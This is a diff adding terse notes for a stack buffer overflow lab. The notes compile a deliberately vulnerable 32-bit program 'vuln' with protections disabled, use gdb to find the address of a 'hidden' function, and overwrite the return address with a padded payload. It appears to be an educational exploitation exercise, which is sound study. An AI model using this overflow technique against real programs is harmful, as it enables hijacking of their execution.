@@ -1,0 +1,14 @@
+sudo apt-get install gcc-multilib
+ulimit -c unlimited 
+gcc -O0 -fno-builtin -fno-stack-protector -m32 -Wall -std=c11 -ggdb -z execstack -o vuln vuln.c
+python3 -c "print('a' * 32)" | ./vuln  
+gdb -q -c core -ex quit 
+gdb vuln
+> b main
+> r
+> p hidden
+> q
+0x56556226
+python3 -c "print('a' * 44 + '\x26\x62\x55\x56')" | ./vuln
+
+56556226
